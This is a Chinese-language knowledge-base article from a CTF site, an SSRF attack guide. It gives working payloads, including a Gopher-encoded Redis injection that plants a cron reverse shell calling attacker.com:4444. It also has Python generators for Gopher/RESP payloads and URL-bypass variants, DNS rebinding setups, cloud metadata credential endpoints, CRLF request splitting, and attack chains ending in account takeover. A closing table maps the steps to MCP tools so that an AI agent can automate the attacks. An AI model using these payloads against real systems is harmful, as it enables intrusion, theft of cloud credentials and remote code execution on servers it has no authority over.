---
id: "ctf-website/04-ssrf/ssrf"
title: "SSRF (Server-Side Request Forgery)"
title_en: "SSRF (Server-Side Request Forgery)"
summary: >
  服务端请求伪造（SSRF）完整攻击指南，聚焦Gopher协议接管内网Redis/MySQL/Memcached等组件、DNS重绑定绕过IP白名单、URL解析器不一致性绕过、云Metadata端点利用，以及2024-2025年高级绕过技术（IMDSv2、IPv6嵌入、0.0.0.0/8绕过）。
summary_en: >
  Comprehensive SSRF attack guide focused on Gopher protocol for internal service takeover (Redis, MySQL, Memcached), DNS rebinding to bypass IP whitelists, URL parser differential attacks, cloud metadata endpoint exploitation, and 2024-2025 advanced bypass techniques including IMDSv2 proxy chains, IPv6 embedding, and 0.0.0.0/8 bypass.
board: "ctf-website"
category: "04-ssrf"
signals: ["SSRF", "server-side request forgery", "Gopher协议", "DNS rebinding", "内网穿透", "cloud metadata", "IMDSv2 bypass"]
mcp_tools: ["http_probe", "kb_router", "kb_read_file"]
keywords: ["SSRF", "Gopher协议", "Redis攻击", "DNS重绑定", "云metadata", "内网渗透", "URL解析器绕过", "IMDSv2"]
difficulty: "intermediate"
tags: ["ssrf", "web-security", "cloud", "injection", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---
# SSRF (Server-Side Request Forgery)

服务器端请求伪造（SSRF）通常被用作击穿内外网隔离的突破口。本指南聚焦于**如何通过 Gopher 协议接管内网组件**，以及**DNS 重绑定、多解析器差异等 Bypass 高级绕过技术**。

---

## 1. Gopher 协议与内网服务接管

Gopher 协议（`gopher://`）允许向指定的 IP 和端口发送任意的 TCP 原始数据流。它是 SSRF 从“读取网页”升级为“执行命令”的终极武器。

### A. 攻击内网 Redis
Redis 采用 RESP (REdis Serialization Protocol) 纯文本协议交互。若内网 Redis 未配置密码，我们可以构造 RESP 流并通过 Gopher 注入写计划任务或 SSH Key。

*   **Redis 命令序列**：
    ```text
    flushall
    set cmd "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n"
    config set dir /var/spool/cron/
    config set dbfilename root
    save
    quit
    ```
*   **转化为 Gopher 格式**：
    需要将换行符替换为 `\r\n`（即 `%0d%0a`），并在整个流前面加上一个虚拟的填充字符（Gopher 协议发包时会吃掉第一个字符）：
    ```text
    gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0acmd%0d%0a$69%0d%0a%0a%0a*/1%20*%20*%20*%20*%20/bin/bash%20-i%20%3E%26%20/dev/tcp/attacker.com/4444%200%3E%261%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
    ```
    *注意*：在发送 HTTP 请求触发 SSRF 时，以上 Gopher Payload 必须进行 **URL 双重编码**，以防中间的 HTTP 解析器对 `%0d%0a` 进行解码。

---

## 2. DNS Rebinding (DNS 重绑定) 实战

许多后端采用“先检查，后请求”的模式防范 SSRF，如：
```python
# 脆弱性逻辑伪代码
ip = dns_resolve(url.host)
if is_internal_ip(ip):
    return "Error: Internal IP blocked"
response = requests.get(url)  # 此时会发起第二次 DNS 解析！
```

### A. 攻击时序图
```mermaid
sequenceDiagram
    participant VulnServer as 目标 Web 服务
    participant DNS as 恶意 DNS 服务器 (TTL=0)
    participant Target as 内网敏感服务 (127.0.0.1)

    VulnServer->>DNS: 1. 解析 evil.attacker.com
    DNS-->>VulnServer: 返回安全公网 IP (8.8.8.8)
    Note over VulnServer: 通过 is_internal_ip 检查
    VulnServer->>DNS: 2. 发起 HTTP GET 请求 (发起第二次解析)
    DNS-->>VulnServer: 返回内网目标 IP (127.0.0.1)
    VulnServer->>Target: 3. 发送请求数据
    Target-->>VulnServer: 4. 返回内网敏感数据
```

### B. DNS 部署配置
利用开源 DNS 服务（如 `singularity` 或 `whonow`）进行测试：
*   域名结构：`a.<ip>.<ttl>.b.<ip>.<ttl>.<random>.rebind.network`
*   示例：`a.8.8.8.8.1.b.127.0.0.1.1.random.rebind.network` (第一次返回公网，第二次返回回环，TTL均为1秒)。

---

## 3. 高级 Bypass 绕过策略

### A. IP 进制与表示法替换
许多过滤器使用正则匹配 `127.0.0.1` 或 `192.168.`，可通过以下等价 IP 表达绕过：
*   **十进制 IP**：`2130706433`（等于 `127.0.0.1`）
*   **十六进制 IP**：`0x7f000001`
*   **八进制 IP**：`017700000001`
*   **省略 0 简写**：`127.1` 或 `10.1`
*   **本地回环 IPv6 变形**：`[::1]` 或 `[0:0:0:0:0:0:0:1]`

### B. URL 解析器不一致性 (Parser Differential)
在某些语言（如 Java, Node, Python）中，校验 URL 的库和实际发送请求的库在切分 Hostname、Credentials 和 Port 时逻辑存在偏差。

*   **UserInfo 绕过**：
    `http://allowed-domain.com@127.0.0.1:80`
    *有些校验器认为主机是 `allowed-domain.com`，但底层 curl 或 Socket 实际请求的 Host 是 `127.0.0.1`。*
*   **混淆字符与斜杠斜线**：
    `http://allowed-domain.com#@127.0.0.1/` 或 `http://allowed-domain.com\@127.0.0.1/`
    根据 RFC 规范的不同，有些解析器视 `#` 或 `\` 后面的部分为 Path 或 Fragment，有些则视其为 Userinfo 标志，从而导致对实际目标的误判。

### B.1 解析器差异打点矩阵

SSRF 过滤通常不是“一个解析器完成所有动作”，而是 `校验 parser`、`跳转 parser`、`HTTP client parser`、`代理 parser` 串在一起。打点时不要只测一个 payload，要把同一目标做成多种等价表示，看哪一层先露出差异。

| 变体 | Payload 形态 | 命中信号 | 常见失败样本 |
|---|---|---|---|
| UserInfo | `http://allow.com@127.0.0.1:8080/` | 后端访问 `127.0.0.1`，Host 校验仍显示 `allow.com` | 返回 `400 invalid userinfo` |
| Fragment | `http://127.0.0.1:8080#@allow.com/` | 校验器只看 `#` 后文本，HTTP client 丢弃 fragment | 服务端先规范化 URL |
| Backslash | `http://allow.com\@127.0.0.1:8080/` | Java/Node/Go 对 `\` 归一化不同 | WAF 把 `\` 提前替换成 `/` |
| Encoded slash | `http://allow.com%2f%2f127.0.0.1/` | 校验前后 decode 次数不同 | HTTP client 不二次 decode |
| Mixed scheme | `http:gopher://127.0.0.1:6379/_...` | 前置正则只匹配 `^http`，下游按第二个 scheme 处理 | 标准 URL parser 拒绝 |
| IPv4 int | `http://2130706433:8000/` | 正则未覆盖整数 IP | 语言运行时不接受整数 host |
| IPv4 hex | `http://0x7f000001:8000/` | curl/libc 接受十六进制 | Java `URI` 保持字符串不解析 |
| IPv6 mapped | `http://[::ffff:127.0.0.1]:8000/` | 过滤器只拦 IPv4 字符串 | 目标服务未监听 IPv6 |
| DNS wildcard | `http://127.0.0.1.nip.io:8000/` | 域名校验通过，DNS 解析到内网 | 服务端固定解析器禁止公网 DNS |

```python
from urllib.parse import quote

def ssrf_url_variants(host="127.0.0.1", port=80, allow="example.com", path="/"):
    base = f"{host}:{port}{path}"
    raw = [
        f"http://{base}",
        f"http://{allow}@{base}",
        f"http://{allow}\\@{base}",
        f"http://{base}#@{allow}/",
        f"http://2130706433:{port}{path}",
        f"http://0x7f000001:{port}{path}",
        f"http://017700000001:{port}{path}",
        f"http://[::ffff:{host}]:{port}{path}",
        f"http://{host}.nip.io:{port}{path}",
    ]
    return raw + [quote(u, safe=":/?&=%#@[]\\") for u in raw]

for u in ssrf_url_variants(port=8080, allow="cdn.example.com"):
    print(u)
```

成功标志不要只看状态码：`200` 可能是前置代理页面，`403` 也可能说明已经打到内网服务。优先记录响应头里的 `Server`、错误页框架名、响应时间、连接拒绝/超时差异、目标端口 banner。

### C. 302 重定向配合
如果后端对输入的 URL 主机进行了极其严格的域名与 IP 审查，但**开启了 Follow Redirects（跟随重定向）**：
*   输入：`http://attacker.com/302.php`
*   后端校验 `attacker.com` 的 IP，发现为合法的公网 IP，放行。
*   请求发包时，`attacker.com/302.php` 返回：
    ```http
    HTTP/1.1 302 Found
    Location: gopher://127.0.0.1:6379/_...
    ```
*   后端底层 HTTP 客户端跟随跳转，对 `gopher://127.0.0.1` 发包，成功绕过前端 IP 静态过滤。

### D. DNS Pin 绕过 (不同解析器差异)
```python
# 同时指定 A 记录到公网 + 内网 IP
# 第一次解析拿到公网，通过检查；第二次解析拿到内网
# 恶意 DNS 配置 (用 singularity/rebind):
#   evil.com → TTL=0, 轮流返回 8.8.8.8 和 127.0.0.1
```

### E. CRLF 头注入 → SSRF
```http
GET /api/fetch?url=http://127.0.0.1:8080%0d%0aHost:%20evil.com HTTP/1.1
```
如果后端不做 CRLF 净化就把 url 参数值拼到 HTTP 请求中 → 可注入额外 Header / 拆分请求。

---

## 4. 云 Metadata 端点

```python
# 各云厂商 metadata API
CLOUD_ENDPOINTS = {
    "AWS":           "http://169.254.169.254/latest/meta-data/",
    "AWS IMDSv1":    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS IMDSv2":    "http://169.254.169.254/latest/api/token",  # 需 PUT + header
    "GCP":           "http://metadata.google.internal/computeMetadata/v1/",
    "Azure":         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "DigitalOcean":  "http://169.254.169.254/metadata/v1.json",
    "Oracle Cloud":  "http://169.254.169.254/opc/v1/instance/",
    "Alibaba Cloud": "http://100.100.100.200/latest/meta-data/",
    "Tencent Cloud": "http://metadata.tencentyun.com/latest/meta-data/",
}

# AWS IMDSv2 (需要 PUT token)
# curl -X PUT http://169.254.169.254/latest/api/token \
#   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# curl http://169.254.169.254/latest/meta-data/ \
#   -H "X-aws-ec2-metadata-token: <token>"
```

---

## 5. 更多内网服务利用

```python
# Gopher → 各种协议

# MySQL (未授权)
# gopher://127.0.0.1:3306/_%00%00%00%00...  (握手包)

# Memcached
# gopher://127.0.0.1:11211/_stats%0d%0a

# PHP-FPM (FastCGI → 通过 Gopher 发 FastCGI 包)
# gopher://127.0.0.1:9000/_[FastCGI binary proto]

# SMTP (伪造邮件)
# gopher://127.0.0.1:25/_HELO attacker%0d%0aMAIL FROM:...

# Docker API
# http://127.0.0.1:2375/containers/json
# http://127.0.0.1:2375/exec  → 创建容器并执行命令

# Elasticsearch
# http://127.0.0.1:9200/_cat/indices
# http://127.0.0.1:9200/_search?q=flag

# etcd
# http://127.0.0.1:2379/v2/keys
```

### A. RESP / Gopher Payload 生成器

手写 `%0d%0a` 很容易错长度。先生成 RESP，再做 URL encode；触发 SSRF 的地方如果会先 decode 一次，就把结果再 encode 一次。

```python
from urllib.parse import quote

def resp(*parts: str) -> bytes:
    out = [f"*{len(parts)}\r\n".encode()]
    for part in parts:
        b = part.encode()
        out.append(f"${len(b)}\r\n".encode() + b + b"\r\n")
    return b"".join(out)

def gopher_payload(host: str, port: int, frames: list[bytes], double_encode=False) -> str:
    raw = b"".join(frames)
    payload = "_" + quote(raw, safe="")
    if double_encode:
        payload = quote(payload, safe="")
    return f"gopher://{host}:{port}/{payload}"

frames = [
    resp("PING"),
    resp("INFO"),
    resp("QUIT"),
]
print(gopher_payload("127.0.0.1", 6379, frames))
```

Redis 命中样本：

```text
+PONG
$...
redis_version:...
```

失败样本：

```text
-NOAUTH Authentication required.
-ERR Protocol error
```

`NOAUTH` 说明服务打到了，下一步转向弱口令、内网凭据泄露或利用其他协议；`Protocol error` 多半是 CRLF、RESP 长度、Gopher 首字符 `_` 或 encode 次数错了。

### B. FastCGI 打点顺序

PHP-FPM 不是 HTTP，不能直接 `GET /index.php`。要构造 FastCGI record：`FCGI_BEGIN_REQUEST` → 多个 `FCGI_PARAMS` → 空 `FCGI_PARAMS` → `FCGI_STDIN`。CTF 中最容易错的是 `SCRIPT_FILENAME` 和 `DOCUMENT_ROOT` 不匹配。

| 参数 | 作用 | 典型取值 |
|---|---|---|
| `SCRIPT_FILENAME` | 要执行的 PHP 文件绝对路径 | `/var/www/html/index.php` |
| `DOCUMENT_ROOT` | Web 根目录 | `/var/www/html` |
| `REQUEST_METHOD` | 触发方式 | `POST` |
| `PHP_VALUE` | 临时 PHP 配置 | `auto_prepend_file=php://input` |
| `CONTENT_LENGTH` | stdin 字节数 | 与 body 长度完全一致 |

确认路径时先打 `phpinfo()` 或读取错误回显：`Primary script unknown` 表示 FPM 可达但路径错；连接超时表示端口、协议或过滤层还没过。

---

## 6. 协议与 Schema 全表

```
http://    → HTTP GET/POST
https://   → HTTPS
file://    → 本地文件读取 (Java/php://)
gopher://  → 任意 TCP 数据流
dict://    → DICT 协议 (dict://127.0.0.1:6379/info)
ftp://     → FTP 协议 (可带凭证)
sftp://    → SFTP
tftp://    → TFTP
ldap://    → LDAP 查询
netdoc://  → Java 文件读取 (netdoc:///etc/passwd)
jar://     → Java JAR 读取
php://     → PHP stream
expect://  → RCE (PHP expect 模块)
ogg://     → Oracle 外部表
```

---

## 7. 攻击链

```
SSRF → Cloud Metadata → IAM credential → AWS CLI → 全账户接管
SSRF → Gopher Redis → crontab 写反弹 shell → RCE
SSRF → Docker API → 创建 privileged 容器 → 宿主机 RCE
SSRF → Elasticsearch → 索引数据导出 → 数据泄露
SSRF → 内网 Jenkins → Script Console → RCE
SSRF → Gopher FastCGI → PHP-FPM 代码执行 → RCE
SSRF → 内部 Admin Panel → 功能滥用 → 数据操作
SSRF → DNS Rebinding → 绕过 IP 白名单 → 内网横向
302 Redirect → SSRF → 绕过 URL 白名单 → 内网请求
Open Redirect → SSRF → 两步绕过 → Metadata 访问
```

---

## 8. Advanced SSRF Bypass (2024-2025)

### IMDSv2 Bypass via Proxy Chain

```
# IMDSv2 需要 X-aws-ec2-metadata-token header
# 但某些内网服务可能设置了任意 header → 可以利用

# Chain: SSRF → internal Atlassian proxy (可设自定义 header)
#       → proxy 设置 X-aws-ec2-metadata-token → IMDSv2 token endpoint
#       → 拿到 token → IMDSv2 metadata → IAM credential
```

### IPv6 Embedding Patterns

```python
# 7 种 IPv6 表示法绕过 IP 过滤器
IPV6_BYPASS = [
    "http://[::1]/",                # 标准 IPv6 localhost
    "http://[0:0:0:0:0:0:0:1]/",   # 完整 IPv6
    "http://[::ffff:127.0.0.1]/",   # IPv4-mapped IPv6
    "http://[::127.0.0.1]/",        # 兼容格式
    "http://[::0:1]/",              # 缩写
    "http://[::0:127.0.0.1]/",      # 混合
    "http://0x7f000001/",           # 十六进制: 127.0.0.1
]
```

### 0.0.0.0/8 Bypass

```python
# 0.0.0.0/8 在某些系统也解析到 localhost
# WAF 通常只过滤 127.0.0.0/8 → 0.0.0.0 可能被忽略
"http://0.0.0.0:8080/admin"
"http://0/exec?cmd=id"  # 在某些 Unix 上，0 = 0.0.0.0
```

### Wildcard DNS

```bash
# nip.io / sslip.io → DNS 解析到任意 IP
# http://127.0.0.1.nip.io   → 解析为 127.0.0.1
# http://192.168.1.1.nip.io → 解析为 192.168.1.1
# 如果 WAF 只检查域名白名单，不解析 DNS → bypass

curl http://metadata.169.254.169.254.nip.io/latest/meta-data/
```

### CRLF in URL Path → Request Splitting

```
# SSRF → request splitting via CRLF in path
# http://127.0.0.1:80/%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a%0d%0a
# → 第一个请求: GET / HTTP/1.1
# → 第二个请求: GET /admin HTTP/1.1
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| SSRF 端点探测 | `http_probe` | HTTP GET 探测 SSRF 入口点 |
| 知识检索 | `kb_router` | 按 SSRF 攻击信号搜索知识库 |
| 知识库文件读取 | `kb_read_file` | 读取知识库技术文件内容 |

## Evidence

- 保存 baseline、变体 URL、最终解析 host、响应状态、关键响应头和正文摘要。
- 对每个命中记录：入口参数、encode 次数、是否跟随 redirect、目标端口、协议 banner、成功响应和失败样本。
- 记录 DNS rebinding 的解析序列、TTL、两次请求间隔和服务端缓存表现。
- 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
